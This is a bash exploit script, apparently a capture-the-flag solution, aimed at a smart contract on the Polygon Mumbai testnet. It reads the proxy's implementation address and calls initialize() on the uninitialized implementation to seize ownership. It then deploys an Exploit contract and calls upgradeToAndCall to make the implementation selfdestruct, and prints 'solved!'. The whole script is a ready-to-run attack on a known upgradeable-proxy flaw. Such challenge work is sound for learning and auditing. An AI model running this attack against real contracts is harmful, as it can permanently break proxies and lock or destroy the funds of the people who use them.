#!/bin/bash

PRIVATE_KEY="$1"
if [ -z "$PRIVATE_KEY" ]
then
    echo "PRIVATE_KEY must be passed as the first argument" >&2
    exit 1
fi

CONTRACT_ADDRESS="$2"
if [ -z "$CONTRACT_ADDRESS" ]
then
    echo "CONTRACT_ADDRESS must be passed as the second argument" >&2
    exit 1
fi

ADDRESS=$(cast wallet address $PRIVATE_KEY)

echo "[INFO] Getting implementation contract address..." >&2
IMPLEMENTATION_ADDRESS=$(cast implementation \
    --rpc-url https://matic-mumbai.chainstacklabs.com \
    "$CONTRACT_ADDRESS")
echo "[INFO] Implementation address: $IMPLEMENTATION_ADDRESS" >&2

echo "[INFO] Execute initialize function in implementation..." >&2
cast send \
    --rpc-url https://matic-mumbai.chainstacklabs.com \
    --private-key $PRIVATE_KEY \
    "$IMPLEMENTATION_ADDRESS" \
    "initialize()"

if [ $? -ne 0 ]
then
    echo "[ERROR] Could not initialize the contract" >&2
    exit 1
fi

echo "[INFO] Deploying selfdestruct contract..." >&2
SELFDESTRUCT_ADDRESS=$(forge create \
    --rpc-url https://matic-mumbai.chainstacklabs.com \
    --private-key $PRIVATE_KEY \
    src/Exploit.sol:Exploit\
    | grep "Deployed to:" \
    | awk '{print $3}')

if [ $? -ne 0 ] || [ -z "$SELFDESTRUCT_ADDRESS" ]
then
    echo "[ERROR] Selfdestruct contract deployment failed" >&2
    exit 1
fi
echo "[INFO] Contract deployed to $SELFDESTRUCT_ADDRESS" >&2

echo "[INFO] Updating and selfdestructing implementation..." >&2
cast send \
    --rpc-url https://matic-mumbai.chainstacklabs.com \
    --private-key $PRIVATE_KEY \
    "$IMPLEMENTATION_ADDRESS" \
    "upgradeToAndCall(address,bytes memory)" \
    "$SELFDESTRUCT_ADDRESS" \
    $(cast calldata "run()")

if [ $? -ne 0 ]
then
    echo "[ERROR] Could not selfdestruct the implementation" >&2
    exit 1
fi

echo "solved!"
